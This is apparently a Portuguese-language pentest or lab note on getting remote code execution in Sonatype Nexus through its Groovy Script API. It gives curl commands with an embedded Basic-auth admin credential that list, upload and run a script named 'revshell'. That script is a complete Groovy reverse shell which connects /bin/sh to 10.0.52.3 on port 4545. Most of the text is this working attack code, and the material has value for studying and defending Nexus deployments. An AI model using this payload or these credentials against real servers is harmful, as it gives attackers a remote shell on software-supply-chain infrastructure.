## O que é
Sonatype Nexus é um ==gerenciador de repositórios de software== que armazena, gerencia e distribui artefatos de desenvolvimento, como bibliotecas, binários, imagens Docker e pacotes, garantindo a segurança e o controle da supply chain de software.
## RCE
Pode ser que o caminho dos endpoints não estejam exatamente como na documentação, para validar qual seria o caminho certo podemos ver se o arquivo `swagger.json` está presente, esse arquivo mostra os endpoints e uma pequena documentação sobre cada endpoint.

De acordo com a documentação https://help.sonatype.com/en/script-api.html podemos criar e executar scripts em groovy pela `API` do nexus.

Primeiro listamos para ver se existe mais algum script rodando.
```sh
curl 'http://nexus-api.nexus.hc/v1/script' -H 'Authorization: Basic YWRtaW46MmtmS1lDIUZvQTQx' 'Accept: application/json'
[]
```

Agora criamos o nosso script malicioso.
```sh
$ cat shell.json                       
{
    "name":"revshell",
    "content":"String host=\"10.0.52.3\";int port=4545;String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
    "type":"groovy"
}

$ curl -X POST 'http://nexus-api.nexus.hc/v1/script' -H 'Authorization: Basic YWRtaW46MmtmS1lDIUZvQTQx' -H 'Accept: application/json' -d @shell.json
```


Então rodamos o script
```sh
$ curl -X POST 'http://nexus-api.nexus.hc/v1/script/revshell/run' -H 'Authorization: Basic YWRtaW46MmtmS1lDIUZvQTQx' -H 'Accept: application/json' -H 'Content-Type: text/plain'

```


